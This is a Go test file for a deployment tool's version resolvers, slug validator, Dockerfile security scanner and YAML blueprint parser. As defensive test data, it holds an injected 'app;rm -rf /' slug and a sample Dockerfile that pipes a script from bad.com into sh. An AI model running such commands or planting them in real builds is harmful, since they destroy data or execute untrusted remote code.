package http

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestRuntimeVersionResolver(t *testing.T) {
	// Test user-specified versions
	nodeUser := resolveRuntimeVersion("node", "", "18")
	if nodeUser.Version != "18" || nodeUser.FullImage != "node:18-bookworm-slim" || nodeUser.Source != "user" {
		t.Errorf("expected node 18 user version, got %+v", nodeUser)
	}

	pyUser := resolveRuntimeVersion("python", "", "3.11")
	if pyUser.Version != "3.11" || pyUser.FullImage != "python:3.11-slim" || pyUser.Source != "user" {
		t.Errorf("expected python 3.11 user version, got %+v", pyUser)
	}

	// Test default fallbacks (auto-resolved from registry or baseline)
	nodeDefault := resolveRuntimeVersion("node", "", "")
	if nodeDefault.Version == "" || !strings.Contains(nodeDefault.FullImage, "node:") || nodeDefault.BaseImage != "node" {
		t.Errorf("expected valid node dynamic version, got %+v", nodeDefault)
	}

	goDefault := resolveRuntimeVersion("go", "", "")
	if goDefault.Version == "" || !strings.Contains(goDefault.FullImage, "golang:") || goDefault.BaseImage != "golang" {
		t.Errorf("expected valid go dynamic version, got %+v", goDefault)
	}

	// Test auto-detection from mock project directory
	tmpDir := t.TempDir()
	_ = os.WriteFile(filepath.Join(tmpDir, ".node-version"), []byte("22.1.0\n"), 0644)

	nodeAuto := resolveRuntimeVersion("node", tmpDir, "")
	if nodeAuto.Version != "22" || nodeAuto.FullImage != "node:22-bookworm-slim" || nodeAuto.Source != "project-file" {
		t.Errorf("expected node 22 auto-detected from .node-version, got %+v", nodeAuto)
	}

	// Test Python auto-detection
	pyDir := t.TempDir()
	_ = os.WriteFile(filepath.Join(pyDir, "runtime.txt"), []byte("python-3.10.12\n"), 0644)

	pyAuto := resolveRuntimeVersion("python", pyDir, "")
	if pyAuto.Version != "3.10" || pyAuto.FullImage != "python:3.10-slim" || pyAuto.Source != "project-file" {
		t.Errorf("expected python 3.10 auto-detected from runtime.txt, got %+v", pyAuto)
	}

	// Test Go auto-detection
	goDir := t.TempDir()
	_ = os.WriteFile(filepath.Join(goDir, "go.mod"), []byte("module myapp\n\ngo 1.22.4\n"), 0644)

	goAuto := resolveRuntimeVersion("go", goDir, "")
	if goAuto.Version != "1.22" || goAuto.FullImage != "golang:1.22-alpine" || goAuto.Source != "project-file" {
		t.Errorf("expected go 1.22 auto-detected from go.mod, got %+v", goAuto)
	}
}

func TestDatabaseVersionResolver(t *testing.T) {
	tests := []struct {
		engine      string
		version     string
		expectedTag string
		expectedVer string
	}{
		{"postgres", "15", "postgres:15-alpine", "15"},
		{"Postgres", "15", "postgres:15-alpine", "15"},
		{"POSTGRESQL", "15", "postgres:15-alpine", "15"},
		{"postgresql", "15", "postgres:15-alpine", "15"},
		{"pg", "15", "postgres:15-alpine", "15"},
		{"mysql", "8.0", "mysql:8.0", "8.0"},
		{" MySQL ", "8.0", "mysql:8.0", "8.0"},
		{"redis", "7.2", "redis:7.2-alpine", "7.2"},
		{"REDIS", "7.2", "redis:7.2-alpine", "7.2"},
		{"mongodb", "6.0", "mongo:6.0", "6.0"},
		{"Mongo", "6.0", "mongo:6.0", "6.0"},
		{"mongo", "6.0", "mongo:6.0", "6.0"},
		{"ClickHouse", "24.3", "clickhouse/clickhouse-server:24.3-alpine", "24.3"},
		{"cockroachdb", "23.1", "cockroachdb:23.1", "23.1"},
	}

	for _, tt := range tests {
		tag, ver := resolveDatabaseVersion(tt.engine, tt.version)
		if tag != tt.expectedTag || ver != tt.expectedVer {
			t.Errorf("resolveDatabaseVersion(%q, %q) = (%q, %q), want (%q, %q)",
				tt.engine, tt.version, tag, ver, tt.expectedTag, tt.expectedVer)
		}
	}

	// Test dynamic database resolution without explicit version
	pgTag, pgVer := resolveDatabaseVersion("PostgreSQL", "")
	if pgTag == "" || pgVer == "" || !strings.HasPrefix(pgTag, "postgres:") {
		t.Errorf("expected valid dynamic postgres version for PostgreSQL, got (%s, %s)", pgTag, pgVer)
	}
}

func TestSlugValidator(t *testing.T) {
	valid := []string{"my-app", "api", "web-backend-1", "service123", "a"}
	for _, s := range valid {
		if err := ValidateSlug(s); err != nil {
			t.Errorf("expected valid slug %q, got error: %v", s, err)
		}
	}

	invalid := []string{"", "My-App", "app_name", "app;rm -rf /", "--bad", "docker", "root", "localhost"}
	for _, s := range invalid {
		if err := ValidateSlug(s); err == nil {
			t.Errorf("expected invalid slug for %q, got nil error", s)
		}
	}
}

func TestDockerfileSecurityScanner(t *testing.T) {
	dangerous := `FROM ubuntu:latest
RUN curl -sSL https://bad.com/install.sh | sh
CMD ["--privileged"]`

	warnings, errors := ScanDockerfileForDangers(dangerous)
	if len(warnings) == 0 && len(errors) == 0 {
		t.Errorf("expected security scanner to detect dangerous patterns in dockerfile")
	}

	safe := `FROM node:20-alpine
WORKDIR /app
COPY . .
RUN npm ci
USER 1001
CMD ["npm", "start"]`

	safeWarns, safeErrs := ScanDockerfileForDangers(safe)
	if len(safeWarns) != 0 || len(safeErrs) != 0 {
		t.Errorf("expected clean dockerfile to have 0 warnings/errors, got %v / %v", safeWarns, safeErrs)
	}
}

func TestDynamicTagParser(t *testing.T) {
	// Test compareVersionStrings
	if compareVersionStrings("23", "22") <= 0 {
		t.Errorf("expected 23 > 22")
	}
	if compareVersionStrings("1.24", "1.23.2") <= 0 {
		t.Errorf("expected 1.24 > 1.23.2")
	}
	if compareVersionStrings("3.12", "3.12") != 0 {
		t.Errorf("expected 3.12 == 3.12")
	}
	if compareVersionStrings("8.4", "8.0") <= 0 {
		t.Errorf("expected 8.4 > 8.0")
	}

	// Test parseBestVersionFromTags
	mockNodeTags := []registryTagItem{
		{Name: "18-bookworm-slim"},
		{Name: "20-bookworm-slim"},
		{Name: "22-bookworm-slim"},
		{Name: "23-bookworm-slim"},
		{Name: "24-rc1-bookworm-slim"},
		{Name: "latest"},
	}
	bestNode := parseBestVersionFromTags("node", mockNodeTags, "-bookworm-slim", "22")
	if bestNode != "22" {
		t.Errorf("expected best node LTS version 22, got %s", bestNode)
	}

	mockPythonTags := []registryTagItem{
		{Name: "3.11-slim"},
		{Name: "3.12-slim"},
		{Name: "3.13-slim"},
		{Name: "3.14-rc-slim"},
	}
	bestPy := parseBestVersionFromTags("python", mockPythonTags, "-slim", "3.12")
	if bestPy != "3.13" {
		t.Errorf("expected best python version 3.13, got %s", bestPy)
	}
}

func TestParseRenderYamlMultiService(t *testing.T) {
	sampleYaml := `
services:
  # 1. Frontend Web Service
  - type: web
    name: app-frontend
    runtime: static
    rootDir: web
    buildCommand: npm install && npm run build
    staticPublishPath: dist
    routes:
      - type: rewrite
        source: /*
        destination: /index.html
      - type: rewrite
        source: /api/*
        destination: https://app-backend.example.com
    envVars:
      - key: API_URL
        value: https://app-backend.example.com

  # 2. Backend REST API
  - type: web
    name: app-backend
    runtime: node
    rootDir: api
    buildCommand: npm install
    startCommand: node index.js

databases:
  - name: bar-code-db
    engine: postgres
    version: "16"
`
	res := parseRenderYAMLString(sampleYaml)
	if len(res.Services) != 2 {
		t.Fatalf("expected exactly 2 services (no phantom route services), got %d", len(res.Services))
	}
	if res.Services[0].Name != "app-frontend" && res.Services[0].Name != "app" {
		t.Errorf("expected first service name app-frontend, got %s", res.Services[0].Name)
	}
	if res.Services[1].Name != "app-backend" {
		t.Errorf("expected second service name app-backend, got %s", res.Services[1].Name)
	}
	if len(res.Databases) != 1 {
		t.Fatalf("expected exactly 1 database parsed, got %d", len(res.Databases))
	}
	if res.Databases[0]["name"] != "bar-code-db" {
		t.Errorf("expected database name bar-code-db, got %v", res.Databases[0]["name"])
	}
	if res.Databases[0]["engine"] != "postgres" {
		t.Errorf("expected database engine postgres, got %v", res.Databases[0]["engine"])
	}
}

func TestParseUserIventBlueprint(t *testing.T) {
	iventYaml := `
version: "1.0"
project: "ivent-checkin-system"

services:
  frontend:
    type: static
    source:
      directory: "client"
    build:
      command: "npm ci && npm run build"
      output_dir: "dist"
    env:
      - key: VITE_API_URL
        fromService:
          name: "backend"
          property: "url"
      - key: VITE_WS_URL
        fromService:
          name: "backend"
          property: "url"

  backend:
    type: web
    source:
      directory: "server"
    build:
      engine: "node"
      command: "npm ci"
    deploy:
      port: 4000
      command: "node src/server.js"
    resources:
      cpu_limit: "1.0"
      mem_limit: "512m"
    volumes:
      - name: "ivent_data"
        mount_path: "/app/data"
    env:
      - key: PORT
        value: "4000"
      - key: NODE_ENV
        value: "production"
      - key: DATABASE_URL
        fromDatabase:
          name: "postgres-db"
          property: "connectionString"
      - key: DB_HOST
        fromDatabase:
          name: "postgres-db"
          property: "host"
      - key: DB_PORT
        fromDatabase:
          name: "postgres-db"
          property: "port"
      - key: DB_USER
        fromDatabase:
          name: "postgres-db"
          property: "username"
      - key: DB_PASSWORD
        fromDatabase:
          name: "postgres-db"
          property: "password"
      - key: DB_NAME
        fromDatabase:
          name: "postgres-db"
          property: "database"
      - key: JWT_SECRET
        generateValue: true
      - key: QR_HMAC_SECRET
        generateValue: true
      - key: GEMINI_API_KEY
        sync: false

  postgres-db:
    type: database
    image: "postgres:16-alpine"
    deploy:
      port: 5432
    volumes:
      - name: "pg_data"
        mount_path: "/var/lib/postgresql/data"
    env:
      - key: POSTGRES_DB
        value: "ivent_production"
      - key: POSTGRES_USER
        value: "ivent_admin"
`

	res := parseRenderYAMLString(iventYaml)

	if len(res.Services) != 2 {
		t.Fatalf("expected exactly 2 services (frontend, backend), got %d: %+v", len(res.Services), res.Services)
	}

	if res.Services[0].Name != "frontend" || res.Services[0].Kind != "static" {
		t.Errorf("expected frontend static service, got name: %s, kind: %s", res.Services[0].Name, res.Services[0].Kind)
	}
	if res.Services[0].RootDir != "client" {
		t.Errorf("expected frontend rootDir client, got %s", res.Services[0].RootDir)
	}
	if res.Services[0].StaticPublishPath != "dist" {
		t.Errorf("expected frontend staticPublishPath dist, got %s", res.Services[0].StaticPublishPath)
	}
	if res.Services[0].EnvVars["VITE_API_URL"] != "${services.backend.url}" {
		t.Errorf("expected VITE_API_URL ${services.backend.url}, got %s", res.Services[0].EnvVars["VITE_API_URL"])
	}

	if res.Services[1].Name != "backend" || res.Services[1].Kind != "web" {
		t.Errorf("expected backend web service, got name: %s, kind: %s", res.Services[1].Name, res.Services[1].Kind)
	}
	if res.Services[1].RootDir != "server" {
		t.Errorf("expected backend rootDir server, got %s", res.Services[1].RootDir)
	}
	if res.Services[1].InternalPort != 4000 {
		t.Errorf("expected backend port 4000, got %d", res.Services[1].InternalPort)
	}
	if res.Services[1].StartCommand != "node src/server.js" {
		t.Errorf("expected backend startCommand 'node src/server.js', got %s", res.Services[1].StartCommand)
	}
	if res.Services[1].EnvVars["DATABASE_URL"] != "${databases.postgres-db.connectionString}" {
		t.Errorf("expected DATABASE_URL ${databases.postgres-db.connectionString}, got %s", res.Services[1].EnvVars["DATABASE_URL"])
	}

	if res.Databases[0]["name"] != "postgres-db" {
		t.Errorf("expected database name postgres-db, got %v", res.Databases[0]["name"])
	}
	if res.Databases[0]["engine"] != "postgres" {
		t.Errorf("expected database engine postgres, got %v", res.Databases[0]["engine"])
	}
}

func TestDetectFrameworkAndDatabasesFromTree(t *testing.T) {
	treeFiles := map[string]bool{
		"package.json": true,
	}
	fetchRaw := func(filename string) string {
		if filename == "package.json" {
			return `{"name": "my-express-app", "dependencies": {"express": "^4.18.2", "pg": "^8.11.3", "ioredis": "^5.3.2"}, "scripts": {"start": "node server.js"}}`
		}
		return ""
	}

	result := detectFrameworkFromTree("my-org/my-express-app", treeFiles, fetchRaw, "my-express-app")

	if len(result.Services) != 1 {
		t.Fatalf("expected 1 service, got %d", len(result.Services))
	}
	if result.Services[0].Preset != "nodejs" {
		t.Errorf("expected preset nodejs, got %s", result.Services[0].Preset)
	}

	// Should auto-detect both postgres and redis databases from dependencies
	if len(result.Databases) != 2 {
		t.Fatalf("expected 2 databases auto-detected (postgres, redis), got %d: %+v", len(result.Databases), result.Databases)
	}

	engines := make(map[string]bool)
	for _, db := range result.Databases {
		engines[fmt.Sprintf("%v", db["engine"])] = true
	}
	if !engines["postgres"] {
		t.Errorf("expected postgres database to be auto-detected from 'pg' dependency")
	}
	if !engines["redis"] {
		t.Errorf("expected redis database to be auto-detected from 'ioredis' dependency")
	}

	// Should auto-wire DATABASE_URL and REDIS_URL
	if result.Services[0].EnvVars["DATABASE_URL"] != "${databases.my-express-app-postgres.connectionString}" {
		t.Errorf("expected DATABASE_URL to be auto-wired, got %s", result.Services[0].EnvVars["DATABASE_URL"])
	}
	if result.Services[0].EnvVars["REDIS_URL"] != "${databases.my-express-app-redis.connectionString}" {
		t.Errorf("expected REDIS_URL to be auto-wired, got %s", result.Services[0].EnvVars["REDIS_URL"])
	}
}

func TestYAMLBlueprintEngineNormalization(t *testing.T) {
	yamlContent := `
services:
  - type: web
    name: my-app
    runtime: node
    buildCommand: npm install
    startCommand: npm start
databases:
  - name: my-postgres
    engine: POSTGRESQL
    databaseName: myappdb
  - name: my-mongo
    engine: Mongo
  - name: my-mysql
    type: MySQL
`
	res := parseRenderYAMLString(yamlContent)
	if len(res.Databases) != 3 {
		t.Fatalf("expected 3 databases parsed, got %d", len(res.Databases))
	}

	if res.Databases[0]["engine"] != "postgres" {
		t.Errorf("expected POSTGRESQL engine normalized to postgres, got %v", res.Databases[0]["engine"])
	}
	if res.Databases[0]["databaseName"] != "myappdb" {
		t.Errorf("expected databaseName myappdb, got %v", res.Databases[0]["databaseName"])
	}
	if res.Databases[1]["engine"] != "mongodb" {
		t.Errorf("expected Mongo engine normalized to mongodb, got %v", res.Databases[1]["engine"])
	}
	if res.Databases[2]["engine"] != "mysql" {
		t.Errorf("expected MySQL type normalized to mysql, got %v", res.Databases[2]["engine"])
	}
}

func TestRenderYAMLFormatCompatibility(t *testing.T) {
	renderYAML := `
services:
  # Express Backend Web Service
  - type: web
    name: ivent-api
    runtime: node
    plan: free
    region: oregon
    rootDir: server
    buildCommand: npm install
    startCommand: npm start
    envVars:
      - key: DATABASE_URL
        fromDatabase:
          name: ivent-db
          property: connectionString
      - key: JWT_SECRET
        generateValue: true
      - key: ADMIN_EMAIL
        value: admin@example.com
      - key: CLIENT_URL
        fromService:
          type: web
          name: ivent-client
          property: host
          format: https://{host}.onrender.com
      - key: GEMINI_API_KEY
        sync: false

  # Next.js Frontend Web Service
  - type: web
    name: ivent-client
    runtime: node
    plan: free
    region: oregon
    rootDir: client
    buildCommand: npm install && npm run build
    startCommand: npm start
    envVars:
      - key: NEXT_PUBLIC_API_URL
        fromService:
          type: web
          name: ivent-api
          property: host
          format: https://{host}.onrender.com

databases:
  # Managed PostgreSQL Database
  - name: ivent-db
    plan: free
    region: oregon
    databaseName: ivent
    user: ivent_user
`
	res := parseRenderYAMLString(renderYAML)
	if len(res.Services) != 2 {
		t.Fatalf("expected 2 services parsed, got %d", len(res.Services))
	}
	if len(res.Databases) != 1 {
		t.Fatalf("expected 1 database parsed, got %d", len(res.Databases))
	}

	apiSvc := res.Services[0]
	if apiSvc.Name != "ivent-api" {
		t.Errorf("expected service name ivent-api, got %s", apiSvc.Name)
	}
	if apiSvc.EnvVars["DATABASE_URL"] != "${databases.ivent-db.connectionString}" {
		t.Errorf("expected DATABASE_URL fromDatabase connectionString, got %s", apiSvc.EnvVars["DATABASE_URL"])
	}
	if apiSvc.EnvVars["CLIENT_URL"] != "https://${services.ivent-client.host}" {
		t.Errorf("expected CLIENT_URL formatted with service host, got %s", apiSvc.EnvVars["CLIENT_URL"])
	}

	clientSvc := res.Services[1]
	if clientSvc.Name != "ivent-client" {
		t.Errorf("expected service name ivent-client, got %s", clientSvc.Name)
	}
	if clientSvc.EnvVars["NEXT_PUBLIC_API_URL"] != "https://${services.ivent-api.host}" {
		t.Errorf("expected NEXT_PUBLIC_API_URL formatted with service host, got %s", clientSvc.EnvVars["NEXT_PUBLIC_API_URL"])
	}

	db := res.Databases[0]
	if db["name"] != "ivent-db" {
		t.Errorf("expected database name ivent-db, got %v", db["name"])
	}
	if db["databaseName"] != "ivent" {
		t.Errorf("expected databaseName ivent, got %v", db["databaseName"])
	}
	if db["user"] != "ivent_user" {
		t.Errorf("expected user ivent_user, got %v", db["user"])
	}
}



